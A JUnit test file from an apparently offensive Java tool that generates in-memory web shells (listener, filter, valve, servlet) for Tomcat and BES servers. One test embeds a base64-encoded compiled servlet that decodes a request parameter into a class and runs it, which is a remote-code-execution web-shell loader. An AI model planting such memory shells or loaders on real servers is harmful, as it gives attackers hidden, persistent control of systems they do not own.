package com.reajason.javaweb.memshell.generator;

import com.reajason.javaweb.Server;
import com.reajason.javaweb.asm.ClassReferenceVisitor;
import com.reajason.javaweb.memshell.ShellType;
import com.reajason.javaweb.memshell.config.CustomConfig;
import com.reajason.javaweb.memshell.config.ShellConfig;
import com.reajason.javaweb.memshell.shelltool.command.CommandListener;
import com.reajason.javaweb.memshell.shelltool.godzilla.GodzillaValve;
import com.reajason.javaweb.utils.CommonUtil;
import lombok.SneakyThrows;
import net.bytebuddy.ByteBuddy;
import net.bytebuddy.description.type.TypeDescription;
import org.junit.jupiter.api.Test;
import org.objectweb.asm.ClassReader;

import java.util.Base64;
import java.util.Set;

import static org.junit.jupiter.api.Assertions.*;


/**
 * @author ReaJason
 * @since 2025/3/19
 */
class CustomShellGeneratorTest {
    @Test
    @SneakyThrows
    void testListener() {
        byte[] bytes = new ByteBuddy()
                .redefine(CommandListener.class)
                .name(CommonUtil.generateClassName()).make().getBytes();
        String className = CommonUtil.generateClassName();
        ShellConfig shellConfig = ShellConfig.builder()
                .server(Server.Tomcat)
                .shellType(ShellType.LISTENER)
                .build();
        CustomConfig customConfig = CustomConfig.builder()
                .shellClassName(className)
                .shellClassBase64(Base64.getEncoder().encodeToString(bytes))
                .shellTypeDescription(TypeDescription.ForLoadedType.of(CommandListener.class))
                .build();
        byte[] bytes1 = new CustomShellGenerator(shellConfig, customConfig).getBytes();

        ClassReader classReader = new ClassReader(bytes1);
        assertEquals(className, classReader.getClassName().replace("/", "."));
    }

    @Test
    @SneakyThrows
    void testFilter() {
        byte[] bytes = new ByteBuddy()
                .subclass(Object.class)
                .name(CommonUtil.generateClassName()).make().getBytes();
        String className = CommonUtil.generateClassName();
        ShellConfig shellConfig = ShellConfig.builder()
                .shellType(ShellType.FILTER)
                .build();
        CustomConfig customConfig = CustomConfig.builder()
                .shellClassName(className)
                .shellClassBase64(Base64.getEncoder().encodeToString(bytes))
                .build();
        byte[] bytes1 = new CustomShellGenerator(shellConfig, customConfig).getBytes();

        ClassReader classReader = new ClassReader(bytes1);
        assertEquals(className, classReader.getClassName().replace("/", "."));
    }

    @Test
    @SneakyThrows
    void testValue() {
        byte[] bytes = new ByteBuddy()
                .redefine(GodzillaValve.class)
                .name(CommonUtil.generateClassName()).make().getBytes();
        String className = CommonUtil.generateClassName();
        ShellConfig shellConfig = ShellConfig.builder()
                .server(Server.BES)
                .shellType(ShellType.VALVE)
                .build();
        CustomConfig customConfig = CustomConfig.builder()
                .shellClassName(className)
                .shellClassBase64(Base64.getEncoder().encodeToString(bytes))
                .build();
        byte[] bytes1 = new CustomShellGenerator(shellConfig, customConfig).getBytes();

        ClassReader classReader = new ClassReader(bytes1);
        ClassReferenceVisitor classVisitor = new ClassReferenceVisitor();
        classReader.accept(classVisitor, 0);
        Set<String> referencedClasses = classVisitor.getReferencedClasses();
        assertEquals(className, classReader.getClassName().replace("/", "."));
        assertTrue(referencedClasses.contains("com/bes/enterprise/webtier/Valve"));
        assertFalse(referencedClasses.contains("org/apache/catalina/Valve"));
    }

    @Test
    @SneakyThrows
    void testJakartaServlet(){
        byte[] bytes = Base64.getDecoder().decode("yv66vgAAADcAgQoAGwBMCAA4CwA7AE0KABoATgoAGgBPCgAPAFALADwAUQoAUgBTBwBUBwBVCgAKAFYIAFcKAA8AWAgAWQcAWgcAWwoADwBcBwBdCgBeAF8HAC8IAGAIAGEKABIAYggAYwgAZAcAZQcAZgcAZwEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAaTEJhc2U2NENsYXNzTG9hZGVyU2VydmxldDsBAARpbml0AQAiKExqYWthcnRhL3NlcnZsZXQvU2VydmxldENvbmZpZzspVgEABmNvbmZpZwEAH0xqYWthcnRhL3NlcnZsZXQvU2VydmxldENvbmZpZzsBAApFeGNlcHRpb25zBwBoAQAQZ2V0U2VydmxldENvbmZpZwEAISgpTGpha2FydGEvc2VydmxldC9TZXJ2bGV0Q29uZmlnOwEAB3NlcnZpY2UBAEQoTGpha2FydGEvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDtMamFrYXJ0YS9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTspVgEABWJ5dGVzAQACW0IBAANvYmoBABJMamF2YS9sYW5nL09iamVjdDsBAAFlAQAVTGphdmEvbGFuZy9FeGNlcHRpb247AQADcmVxAQAgTGpha2FydGEvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDsBAANyZXMBACFMamFrYXJ0YS9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTsBAARkYXRhAQASTGphdmEvbGFuZy9TdHJpbmc7AQANU3RhY2tNYXBUYWJsZQcAaQcAagcAawEADGRlY29kZUJhc2U2NAEAFihMamF2YS9sYW5nL1N0cmluZzspW0IBAAxkZWNvZGVyQ2xhc3MBABFMamF2YS9sYW5nL0NsYXNzOwEAB2RlY29kZXIBAAR2YXI0AQAJYmFzZTY0U3RyAQAWTG9jYWxWYXJpYWJsZVR5cGVUYWJsZQEAFExqYXZhL2xhbmcvQ2xhc3M8Kj47AQAOZ2V0U2VydmxldEluZm8BABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEAB2Rlc3Ryb3kBAApTb3VyY2VGaWxlAQAdQmFzZTY0Q2xhc3NMb2FkZXJTZXJ2bGV0LmphdmEMAB0AHgwAbABtDAA+AD8MAG4AbwwAcABxDAByAHMHAHQMAHUAdgEAE2phdmEvbGFuZy9FeGNlcHRpb24BABpqYXZhL2xhbmcvUnVudGltZUV4Y2VwdGlvbgwAHQB3AQAWc3VuLm1pc2MuQkFTRTY0RGVjb2RlcgwAeAB5AQAMZGVjb2RlQnVmZmVyAQAPamF2YS9sYW5nL0NsYXNzAQAQamF2YS9sYW5nL1N0cmluZwwAegB7AQAQamF2YS9sYW5nL09iamVjdAcAfAwAfQB+AQAQamF2YS51dGlsLkJhc2U2NAEACmdldERlY29kZXIMAH8AgAEABmRlY29kZQEAAAEAGEJhc2U2NENsYXNzTG9hZGVyU2VydmxldAEAFWphdmEvbGFuZy9DbGFzc0xvYWRlcgEAF2pha2FydGEvc2VydmxldC9TZXJ2bGV0AQAgamFrYXJ0YS9zZXJ2bGV0L1NlcnZsZXRFeGNlcHRpb24BAB5qYWthcnRhL3NlcnZsZXQvU2VydmxldFJlcXVlc3QBAB9qYWthcnRhL3NlcnZsZXQvU2VydmxldFJlc3BvbnNlAQATamF2YS9pby9JT0V4Y2VwdGlvbgEADGdldFBhcmFtZXRlcgEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQALZGVmaW5lQ2xhc3MBACkoTGphdmEvbGFuZy9TdHJpbmc7W0JJSSlMamF2YS9sYW5nL0NsYXNzOwEAC25ld0luc3RhbmNlAQAUKClMamF2YS9sYW5nL09iamVjdDsBAAlnZXRXcml0ZXIBABcoKUxqYXZhL2lvL1ByaW50V3JpdGVyOwEAE2phdmEvaW8vUHJpbnRXcml0ZXIBAAVwcmludAEAFShMamF2YS9sYW5nL09iamVjdDspVgEAGChMamF2YS9sYW5nL1Rocm93YWJsZTspVgEAB2Zvck5hbWUBACUoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvQ2xhc3M7AQAJZ2V0TWV0aG9kAQBAKExqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEAGGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZAEABmludm9rZQEAOShMamF2YS9sYW5nL09iamVjdDtbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEACGdldENsYXNzAQATKClMamF2YS9sYW5nL0NsYXNzOwAhABoAGwABABwAAAAHAAEAHQAeAAEAHwAAAC8AAQABAAAABSq3AAGxAAAAAgAgAAAABgABAAAACQAhAAAADAABAAAABQAiACMAAAABACQAJQACAB8AAAA1AAAAAgAAAAGxAAAAAgAgAAAABgABAAAADgAhAAAAFgACAAAAAQAiACMAAAAAAAEAJgAnAAEAKAAAAAQAAQApAAEAKgArAAEAHwAAACwAAQABAAAAAgGwAAAAAgAgAAAABgABAAAAEgAhAAAADAABAAAAAgAiACMAAAABACwALQACAB8AAADjAAUABgAAADorEgK5AAMCAE4tuAAEOgQqARkEAxkEvrYABbYABjoFLLkABwEAGQW2AAinAA86BLsAClkZBLcAC7+xAAEACQAqAC0ACQADACAAAAAiAAgAAAAXAAkAGQAPABoAHwAbACoAHgAtABwALwAdADkAHwAhAAAASAAHAA8AGwAuAC8ABAAfAAsAMAAxAAUALwAKADIAMwAEAAAAOgAiACMAAAAAADoANAA1AAEAAAA6ADYANwACAAkAMQA4ADkAAwA6AAAAGQAC/wAtAAQHABoHADsHADwHABAAAQcACQsAKAAAAAYAAgApAD0ACAA+AD8AAgAfAAAA+gAGAAQAAABkEgy4AA1MKxIOBL0AD1kDEhBTtgARK7YABgS9ABJZAypTtgATwAAUsEwSFbgADU0sEhYDvQAPtgARAQO9ABK2ABNOLbYAFxIYBL0AD1kDEhBTtgARLQS9ABJZAypTtgATwAAUsAABAAAAJwAoAAkABAAgAAAAGgAGAAAAIwAGACQAKAAlACkAJgAvACcAQgAoACEAAAA0AAUABgAiAEAAQQABAC8ANQBAAEEAAgBCACIAQgAxAAMAKQA7AEMAMwABAAAAZABEADkAAABFAAAAFgACAAYAIgBAAEYAAQAvADUAQABGAAIAOgAAAAYAAWgHAAkAKAAAAAQAAQAJAAEARwBIAAEAHwAAAC0AAQABAAAAAxIZsAAAAAIAIAAAAAYAAQAAAC4AIQAAAAwAAQAAAAMAIgAjAAAAAQBJAB4AAQAfAAAAKwAAAAEAAAABsQAAAAIAIAAAAAYAAQAAADQAIQAAAAwAAQAAAAEAIgAjAAAAAQBKAAAAAgBL");
        String className = CommonUtil.generateClassName();
        ShellConfig shellConfig = ShellConfig.builder()
                .server(Server.Tomcat)
                .shellType(ShellType.SERVLET)
                .build();
        CustomConfig customConfig = CustomConfig.builder()
                .shellClassName(className)
                .shellClassBase64(Base64.getEncoder().encodeToString(bytes))
                .build();
        byte[] bytes1 = new CustomShellGenerator(shellConfig, customConfig).getBytes();
        ClassReader classReader = new ClassReader(bytes1);
        ClassReferenceVisitor classVisitor = new ClassReferenceVisitor();
        classReader.accept(classVisitor, 0);
        Set<String> referencedClasses = classVisitor.getReferencedClasses();
        assertTrue(referencedClasses.contains("jakarta/servlet/Servlet"));
    }
}